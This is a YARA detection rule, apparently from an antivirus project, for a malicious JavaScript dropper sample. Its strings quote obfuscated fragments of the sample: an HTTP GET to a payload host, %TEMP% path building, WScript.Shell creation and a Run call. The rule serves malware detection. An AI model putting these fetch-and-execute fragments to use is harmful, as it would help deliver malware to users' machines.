rule sig_20160427_30640207e8fd8af47d2894bde2f12132 {
  meta:
    description = "datamaliciousorder - file 20160427_30640207e8fd8af47d2894bde2f12132.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "09c7f049ca5ec0e5cc138c2a39ec201e160c69ed0ea67a1308d32671b5b9ca9c"

  strings:
    $s1  = "UvbceAqbat[RifttDufag](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function MfybtVuvud() {return ZlbyqBchzg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xIk288H" ascii
    $s3  = "function MfybtVuvud() {return ZlbyqBchzg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xIk288H" ascii
    $s4  = "function LlpqgPweoh(HuebmJywha, RymduMaycc){SmbkiClvpy = SmbkiClvpy * 1; return HuebmJywha - RymduMaycc;};" fullword ascii
    $s5  = "var ZlbyqBchzg = function PkvkgCgkoc() {return CkmyyOxmnz[JyoblVddlr](\"WScript\"+\".Shell\");}(), YwlmyZkgqm = 11;" fullword ascii
    $s6  = "var CkmyyOxmnz = this[\"WScript\"];" fullword ascii
    $s7  = "if (UvbceAqbat[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function MtcolPyimo(){return OnvljJjfuz + \"\";};" fullword ascii
    $s9  = "function QcrieUrvec() {return ((PzjbpTsfys == true) && (PzjbpTsfys == HriobLhppg)) ? 1 : SmbkiClvpy;};" fullword ascii
    $s10 = "var WdprwAqjss = false;" fullword ascii
    $s11 = "return LlpqgPweoh(YrfxjXbnsg, AbzzjQyolx);" fullword ascii
    $s12 = "var PzjbpTsfys = false;" fullword ascii
    $s13 = "function SqzgcBwriq(){return 23;};" fullword ascii
    $s14 = "WdprwAqjss = true;" fullword ascii
    $s15 = "function VdmxuChqvg(XueldFzych){ZlbyqBchzg[\"R\"+\"un\"](XueldFzych, SmbkiClvpy, SmbkiClvpy);};" fullword ascii
    $s16 = "var PcgraHddei = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var HriobLhppg = false;" fullword ascii
    $s18 = "function HrjjoRgwbf(FcyojVdakq) {var DjnvrCjvxa = (1, 2, 3, 4, 5, FcyojVdakq); return DjnvrCjvxa;};" fullword ascii
    $s19 = "HriobLhppg = true; " fullword ascii
    $s20 = "}while (TruxzAeysu);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}